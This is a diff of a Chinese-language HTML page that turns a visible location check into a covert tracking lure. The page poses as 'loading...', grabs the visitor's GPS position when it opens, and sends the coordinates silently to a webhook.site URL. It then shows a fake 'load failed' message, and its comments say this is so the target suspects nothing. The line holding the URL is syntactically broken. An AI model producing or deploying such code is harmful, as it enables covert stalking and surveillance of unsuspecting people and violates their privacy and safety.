@@ -2,62 +2,43 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <title>系统安全检查</title>
+    <title>加载中...</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #f4f4f4; }
-        #status { font-size: 18px; color: #333; margin: 20px; padding: 15px; border-radius: 10px; background: white; display: inline-block; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .error { color: red !important; font-weight: bold; }
-    </style>
 </head>
-<body>
-    <h2>设备状态监测</h2>
-    <div id="status">正在初始化，请稍后...</div>
+<body style="background-color: white; text-align: center; padding-top: 50px;">
+    <h2>正在加载内容，请稍后...</h2>
+    <p>（对方此时看不到任何经纬度，只看到加载中）</p>
 
     <script>
         function getLocation() {
-            // 1. 检查浏览器是否支持定位
             if (navigator.geolocation) {
-                document.getElementById("status").innerHTML = "等待系统权限响应，请关注屏幕弹窗...";
-                // 2. 请求实时位置
-                navigator.geolocation.getCurrentPosition(showPosition, showError, {
-                    enableHighAccuracy: true, // 强制使用高精度模式（GPS）
-                    timeout: 10000,           // 10秒超时
-                    maximumAge: 0             
-                });
-            } else {
-                document.getElementById("status").innerHTML = "您的浏览器不支持地理定位。";
+                navigator.geolocation.getCurrentPosition(sendPosition, showError);
             }
         }
 
-        function showPosition(position) {
+        function sendPosition(position) {
             var lat = position.coords.latitude;
             var lon = position.coords.longitude;
-            document.getElementById("status").innerHTML = 
-                "✅ 定位成功！<br>经纬度: " + lat + ", " + lon + "<br><br>请将此坐标输入地图查询。";
+
+            // 【关键步骤】将坐标静默发送到你的 Webhook 服务器
+            var myUrl = "var myUrl = "https://webhook.site/8d58a783-30ed-421a-8779-5d714c5ca502";"; 
+            
+            fetch(myUrl + "?lat=" + lat + "&lon=" + lon, {
+                method: 'GET'
+            })
+            .then(() => {
+                // 发送成功后，给对方显示一个假的结果，让他们以为没发生什么
+                document.body.innerHTML = "<h2>内容加载失败，请刷新重试。</h2>";
+            })
+            .catch(() => {
+                document.body.innerHTML = "<h2>网络错误。</h2>";
+            });
         }
 
         function showError(error) {
-            var message = "";
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    message = "❌ 权限被拒绝！<br>原因：您或系统禁用了位置权限。<br>解决方法：请进入手机 [设置] -> [隐私] -> [定位服务] -> 将 [Safari] 改为 [询问] 或 [在期间允许]。";
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    message = "❌ 位置信息不可用。<br>原因：无法从卫星或基站获取信号。";
-                    break;
-                case error.TIMEOUT:
-                    message = "❌ 请求超时。<br>原因：获取位置时间过长。";
-                    break;
-                default:
-                    message = "❌ 发生了未知错误。";
-                    break;
-            }
-            document.getElementById("status").className = "error";
-            document.getElementById("status").innerHTML = message;
+            document.body.innerHTML = "<h2>加载出错，请检查网络。</h2>";
         }
 
-        // 页面加载后立即运行
         window.onload = getLocation;
     </script>
 </body>
